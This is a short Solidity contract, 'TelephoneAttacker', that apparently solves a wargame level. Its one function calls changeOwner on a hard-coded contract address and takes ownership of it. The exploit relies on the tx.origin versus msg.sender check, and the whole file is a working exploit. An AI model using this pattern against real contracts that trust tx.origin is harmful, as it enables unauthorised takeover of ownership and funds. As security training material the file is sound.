// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneAttacker{
    function attack() external {
        address telephoneContractAddr = 0xEcBe8AdF10958bcdf41f15ECbc3f76553Ca08d83;
        (bool success ,bytes memory data) = telephoneContractAddr.call(
            abi.encodeWithSignature("changeOwner(address)", 0x6d2A8c22e10F14cd912aD27df1De519bb5Da3e03)
        );
    }
}